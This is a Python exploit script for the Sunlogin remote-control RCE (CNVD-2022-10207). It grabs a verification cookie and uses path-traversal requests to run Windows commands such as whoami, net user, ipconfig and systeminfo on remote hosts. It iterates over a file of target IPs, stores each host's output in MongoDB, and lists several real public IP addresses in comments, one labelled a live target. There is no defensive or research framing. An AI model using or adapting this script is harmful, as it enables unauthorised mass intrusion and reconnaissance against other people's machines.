import time
import requests
import json
import threading
import sys
import pymongo


client = pymongo.MongoClient(host='localhost', port=27017)

db = client['test']
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

mycol = db['sunlight1']

def exp(url):
    try:
        dic={}
        dic['url']=url
        vul_url = url + "/cgi-bin/rpc?action=verify-haras"
        reps = json.loads(requests.get(vul_url, verify=False, timeout=5).text)
        verify_string = (reps['verify_string'])
        cookies = {"CID": verify_string}
        # print(cookies)
        commands=['whoami','net user','ipconfig /all',"netstat -an ",'systeminfo','tasklist']
        # commands=['whoami']
        for command in commands:
            poc11 = url + "/check?cmd=ping../../../../../../windows/system32/" + command
            # poc11 = url + "/check?cmd=ping..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fsystem32%2FWindowsPowerShell%2Fv1.0%2Fpowershell.exe+%20whoami"
            poc_reps = requests.get(poc11, cookies=cookies, timeout=24, verify=False).text
            if "Verification failure" not in  poc_reps:
                # print(index,line)
                print(url)
                print(command," : ",poc_reps)
                # with open(r'D:\BaiduNetdiskDownload\HACK\CNVD-2022-10207向日葵RCE\file.txt', 'a') as f:
                    # f.write(f'{url}\n')

            dic[command]=poc_reps
        # print(dic)

        mycol.insert_one(dic)
    except Exception as e:
        pass

# url='http://222.66.130.31:49158'
# url='http://183.236.251.24:49156'
# url='http://192.168.52.200:50095'
# url='http://111.207.26.14:49165'
# url='http://47.98.103.169:49167'      #实战IP


url='http://59.125.218.50:1029'
# command='ipconfig /all'
command="whoami"

threads=[]
# with open(r'D:\BaiduNetdiskDownload\HACK\CNVD-2022-10207向日葵RCE\file.txt', 'r') as file:
# # with open(r'D:\Downloads\tmp\sunlight.txt', 'r') as file:
#     for index, line in enumerate(file):
#         # start=0+int(sys.argv[1])*50
#         start=209
#         end=start+100
#         if index>=start and index<=end:
#             # if index==:
#                 # break
#             ip=line.strip('\n')
#             print(index,ip)

#             thread = threading.Thread(target=exp, args=(ip,))
#             threads.append(thread)

# for thread in threads:
#     thread.start()

# for thread in threads:
#     thread.join()

with open(r'D:\BaiduNetdiskDownload\HACK\CNVD-2022-10207向日葵RCE\file.txt', 'r') as file:
# with open(r'D:\Downloads\tmp\sunlight.txt', 'r') as file:
    for index, line in enumerate(file):
        # start=0+int(sys.argv[1])*50
        start=209
        end=start+200
        if index>=start and index<=end:
            # if index==:
                # break
            ip=line.strip('\n')
            print(index,ip)
            exp(ip)
            time.sleep(4)